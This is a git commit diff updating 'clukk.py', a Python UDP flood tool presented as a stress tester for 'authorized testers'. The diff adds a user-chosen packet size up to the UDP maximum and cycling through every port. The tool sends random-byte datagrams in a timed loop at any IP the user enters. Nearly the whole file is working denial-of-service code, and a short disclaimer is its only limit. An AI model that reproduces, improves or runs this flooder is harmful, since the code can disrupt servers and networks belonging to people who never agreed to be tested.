0c8c28328ac9f1a67437d989d82fb337a5ee9bc1
BSP/IOD <innovativeopsdiv.bsp@protonmail.com>
2026-03-20 21:19:29 +0100

    Update clukk.py

--- clukk.py
+++ clukk.py
@@ -2,62 +2,69 @@ import socket
 import random
 import time
 
-print("\n" * 100)
 print("""
-   ______   __            __      __
-  / ____/  / /  __  __   / /__   / /__
- / /      / /  / / / /  / //_/  / //_/
-/ /___   / /  / /_/ /  /  <    /  <
-\____/  /_/   \____/  /_/|_|  /_/|_|
-
-             Release V2.1
+                Clukk
+               NF V2.3
 """)
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-print("We do not want any trouble for abusing users, please use this testing tool for testing or educational purposes.")
+print("We do not want any trouble because of abusers, please use this tool for testing or educational purposes.")
 print("")
-print("            Clukk Details:")
+print("Clukk Details:")
+print("")
 print("""
-           _______________________
-          |                       |
-          | Clukk V2.0            |
-          | Creator: BSP/IOD      |
-          | Purpose: Stress       |
-          | testing for server    |
-          | owners and authorized |
-          | testers.              |
-          |_______________________|
+Clukk NF V2.3
+Creator: BSP/IOD
+Purpose: Stress testing
+for server owners and
+authorized testers.
 """)
+print("")
 print("Multiple windows can be opened for a slight increase in speed.")
 print("")
-bytes = random._urandom(65507)
+
+print("The maximum amount of bytes allowed by UDP is 65507")
+print("Use the xb2b.py tool to convert KB and MB to bytes.")
+bytesAmt = int(input('Amount of bytes: '))
+bytes = random._urandom(bytesAmt)
+print("")
 
 print("Use the url2ip.py tool to resolve the hostname.")
 ip = input('IP: ')
-port = int(input('Port: '))
+print("")
+
+choice = input("Would you like to specify a port? (y/n): ").lower()
+
+if choice == 'y':
+    port = int(input("Port: "))
+    portSpec = True
+else:
+    port = 0
+    portSpec = False
+print("")
 
 print("Use the hour2second.py tool to convert hours to seconds.")
 duration = input('Test time in seconds: ')
-print(" ")
+print("")
 
 timeout = time.time() + float(duration)
-
 sent = 0
 
 
 
 while True:
 
-	if time.time() > timeout:
+    if time.time() > timeout:
 
-		break
+        break
 
-	else:
+    else:
+    
+        pass
 
-		pass
-
-	sock.sendto(bytes,(ip, port))
-
-	sent = sent + 1
-
-	print("-- " + "Clukk: " + "Packet #%s was sent to address %s on port %s."%(sent, ip, port))
+    sock.sendto(bytes,(ip, port))
+    sent = sent + 1
+    print("-- Clukk: Packet #%s of size %s bytes was sent to address %s on port %s."%(sent, bytesAmt, ip, port))
+    if portSpec is False:
+        port = port + 1 if port < 65535 else 1
